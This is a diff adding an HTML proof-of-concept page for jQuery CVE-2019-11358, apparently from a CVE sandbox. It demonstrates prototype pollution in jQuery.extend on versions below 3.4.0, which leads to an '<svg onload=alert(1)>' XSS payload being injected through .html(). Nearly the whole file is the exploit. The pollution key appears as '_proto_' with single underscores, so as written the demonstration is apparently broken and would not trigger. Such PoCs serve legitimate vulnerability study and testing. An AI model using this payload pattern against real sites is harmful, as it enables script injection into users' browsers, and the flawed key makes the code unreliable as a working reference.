@@ -1,0 +1,40 @@
+<!DOCTYPE html>
+<html>
+<head>
+<title>Page Title</title>
+</head>
+<body>
+<!--
+    CVE Sandbox :: jQuery :: CVE-2019-11358
+    Version: jQuery >= 1.0.0 < 3.4.0
+    POC Author: https://twitter.com/therceman
+-->
+
+<script src="https://s.yimg.com/zz/combo?pj/sh/202506092106/js/lib/modernizr.min.js&pj/sh/202506092106/js/lib/jquery-1.11.3.min.js&pj/sh/202506092106/js/lib/slick.min.js&pj/sh/202506092106/js/lib/jquery-ui.min.js&pj/sh/202506092106/js/lib/sbi.min.js&pj/sh/202506092106/js/plugins.js&pj/sh/202506092106/js/scripts.js&pj/sh/202506092106/js/prod.js&pj/sh/202506092106/js/sis.js"></script>
+
+<!-- ---------------------- POC (version: < 3.4.0) ---------------------------------
+    jQuery.extend function is vulnerable to Prototype Pollution vulnerability.
+    Attacker can modify prototype of an Object (_proto_) and trigger XSS payload.
+------------------------------------------------------------------------------------------- -->
+<div id="backLinkContainer"></div>
+
+<script>
+    const defaultConfig = {
+        "backLink": "<a href='https://website.com'>Go Back</a>"
+    };
+
+    const queryParams = {
+        "q": "books",
+        /* Attacker Embedded Query Param. Directly from URL or using other Backend/Frontend manipulations */
+        "_proto_": {
+            "backLink": "<svg onload=alert(1)>"
+        }
+    }
+
+    let config = jQuery.extend(true, defaultConfig, queryParams);
+
+    $('#backLinkContainer').html(config.backLink);
+</script>
+
+</body>
+</html>
